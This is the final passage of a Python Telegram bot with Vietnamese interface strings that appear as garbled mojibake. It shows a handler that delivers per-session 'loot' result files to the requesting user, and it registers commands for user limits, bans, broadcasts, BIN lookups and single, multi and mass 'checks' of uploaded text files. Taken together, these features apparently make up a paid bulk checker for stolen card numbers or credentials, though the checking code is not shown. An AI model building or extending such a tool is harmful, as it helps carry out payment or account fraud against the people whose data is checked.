            _, _, target_user_id, session_ts = data
            session_dir = os.path.join(LOG_DIR, target_user_id, session_ts)
            files = [f for f in os.listdir(session_dir) if f.endswith('.txt')] if os.path.exists(session_dir) else []
            if not files:
                await query.edit_message_text("Session nÃ y khÃ´ng cÃ³ file káº¿t quáº£ nÃ o."); return
            keyboard = []
            for filename in files:
                keyboard.append([InlineKeyboardButton(f"Táº£i {filename}", callback_data=f"loot_getfile_{target_user_id}_{session_ts}_{filename}")])
            keyboard.append([InlineKeyboardButton("Â« Quay láº¡i Lá»‹ch Sá»­", callback_data=f"loot_history_{target_user_id}")])
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(f"Chá»n file Ä‘á»ƒ táº£i tá»« session `{session_ts}`:", reply_markup=reply_markup)

        elif action == "getfile":
            _, _, target_user_id, session_ts, filename = data
            file_path = os.path.join(LOG_DIR, target_user_id, session_ts, filename)
            if os.path.exists(file_path):
                with open(file_path, 'rb') as doc:
                    await context.bot.send_document(chat_id=query.from_user.id, document=doc)
                await query.answer(f"ÄÃ£ gá»­i file {filename}")
            else:
                await query.answer("âŒ Lá»—i: KhÃ´ng tÃ¬m tháº¥y file.", show_alert=True)

def main():
    defaults = Defaults(parse_mode=ParseMode.MARKDOWN, disable_web_page_preview=True)
    application = Application.builder().token(BOT_TOKEN).defaults(defaults).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("info", info))
    application.add_handler(CommandHandler("help", help_command))
    
    application.add_handler(CommandHandler("add", add_user))
    application.add_handler(CommandHandler("ban", ban_user))
    application.add_handler(CommandHandler("show", show_users))
    application.add_handler(CommandHandler("addlimit", add_limit_command))
    application.add_handler(CommandHandler("addlimitmulti", add_multi_limit_command))
    application.add_handler(CommandHandler("showcheck", show_check_command))
    application.add_handler(CommandHandler("lootfile", loot_file_command))
    application.add_handler(CommandHandler("on", turn_bot_on))
    application.add_handler(CommandHandler("off", turn_bot_off))
    application.add_handler(CommandHandler("send", send_message_command))
    application.add_handler(CommandHandler("sendall", send_all_command))
    
    application.add_handler(CommandHandler("cs", cs_command))
    application.add_handler(CommandHandler("bin", bin_command))
    application.add_handler(CommandHandler("multi", multi_check_command))
    application.add_handler(MessageHandler(filters.Document.TEXT & filters.CaptionRegex(r'^/mass(\d*)'), mass_check_handler))
    
    application.add_handler(CallbackQueryHandler(button_handler))
    
    logger.info(f"Bot Ä‘ang cháº¡y vá»›i Admin ID: {ADMIN_ID}")
    application.run_polling()

if __name__ == '__main__':
    main()
